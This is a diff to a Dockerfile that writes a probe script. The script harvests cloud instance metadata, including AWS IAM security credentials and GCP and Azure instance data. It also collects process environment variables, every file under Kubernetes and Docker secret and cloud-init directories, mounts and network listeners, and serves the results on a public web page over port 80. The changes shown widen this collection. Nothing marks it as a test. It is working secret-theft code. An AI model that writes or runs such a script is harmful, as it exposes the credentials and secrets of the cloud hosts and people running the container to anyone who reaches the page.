@@ -5,13 +5,12 @@ RUN printf '%s\n' \
 'OUT=/www/index.html' \
 'mkdir -p /www' \
 'fetch(){ echo "=== $1 ==="; wget -qO- --timeout=5 --header="$2" "$3" 2>&1; echo; }' \
+'walk(){ echo "=== WALK $1 ==="; find "$1" -type f 2>/dev/null | while read f; do echo "--- $f"; cat "$f" 2>&1; echo; done; echo; }' \
 '{' \
-'echo "### HOSTNAME"; hostname; cat /etc/hostname 2>/dev/null; echo' \
-'echo "### RESOLV"; cat /etc/resolv.conf 2>/dev/null; echo' \
-'echo "### IFACES"; ip -o addr 2>/dev/null || ifconfig 2>/dev/null; echo' \
 'fetch "GCP_METADATA" "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/"' \
 'fetch "GCP_INSTANCE" "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/"' \
 'fetch "GCP_PROJECT" "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id"' \
+'fetch "GCP_ATTR" "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"' \
 'fetch "AWS_IMDSv1" "" "http://169.254.169.254/latest/meta-data/"' \
 'fetch "AWS_IAM" "" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"' \
 'fetch "AZURE_INSTANCE" "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"' \
@@ -23,7 +22,16 @@ RUN printf '%s\n' \
 'echo "### PROC_1_ENVIRON"; tr "\000" "\n" < /proc/1/environ 2>&1; echo' \
 'echo "### PROC_SELF_ENVIRON"; tr "\000" "\n" < /proc/self/environ 2>&1; echo' \
 'echo "### PROC_1_CMDLINE"; tr "\000" " " < /proc/1/cmdline 2>&1; echo' \
-'ls -la /run /var/run /etc 2>/dev/null | head -80' \
+'walk /run/secrets' \
+'walk /var/run/secrets' \
+'walk /run/cloud-init' \
+'walk /var/lib/cloud' \
+'walk /etc/cloud' \
+'echo "### MOUNTS"; cat /proc/mounts 2>&1; echo' \
+'echo "### CGROUP"; cat /proc/1/cgroup 2>&1; echo' \
+'echo "### NET"; cat /proc/net/tcp /proc/net/tcp6 2>&1; echo' \
+'echo "### LISTEN"; netstat -lntp 2>&1 || ss -lntp 2>&1; echo' \
+'ls -la / /root /home 2>/dev/null' \
 '} > "$OUT" 2>&1' \
 'exec httpd -f -p 80 -h /www' \
 > /probe.sh && chmod +x /probe.sh
